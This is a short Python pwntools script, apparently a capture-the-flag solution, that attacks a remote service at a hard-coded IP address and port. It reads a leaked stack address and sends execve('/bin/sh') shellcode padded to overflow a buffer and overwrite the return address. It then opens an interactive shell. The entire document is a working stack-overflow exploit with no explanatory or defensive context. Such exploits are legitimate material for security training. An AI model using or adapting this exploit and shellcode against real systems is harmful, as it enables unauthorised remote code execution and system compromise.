from pwn import *

r = remote('140.110.112.77', 2119)
address = int(r.recvline().split()[-1].strip()[2:], 16)
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' 
r.sendline(shellcode + 'a' * (0x78 - len(shellcode)) + p64(address))
r.interactive()
